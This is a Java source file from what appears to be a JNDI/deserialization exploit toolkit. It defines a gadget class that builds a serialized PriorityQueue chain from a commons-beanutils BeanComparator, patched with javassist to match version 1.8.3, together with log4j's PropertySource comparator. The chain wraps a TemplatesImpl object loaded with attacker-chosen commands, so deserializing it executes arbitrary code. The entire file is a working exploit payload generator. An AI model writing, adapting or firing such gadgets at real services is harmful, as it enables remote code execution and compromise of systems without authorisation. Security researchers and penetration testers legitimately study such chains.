package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.*;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.logging.log4j.util.PropertySource;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

import static com.qi4l.jndi.Starter.cmdLine;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.logging.log4j:log4j-core:2.17.1"})
@Authors({"SummerSec"})
public class CommonsBeanutilsPropertySource183 implements ObjectPayload<Object>{
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object template;
        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
            template = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            template = Gadgets.createTemplatesImpl(type, param);
        }
        PropertySource propertySource1 = new PropertySource() {
            @Override
            public int getPriority() {
                return 0;
            }
        };

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        } catch (javassist.NotFoundException e) {
        }
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "comparator", new PropertySource.Comparator());


        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);

        queue.add(propertySource1);
        queue.add(propertySource1);

        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return queue;
    }
}
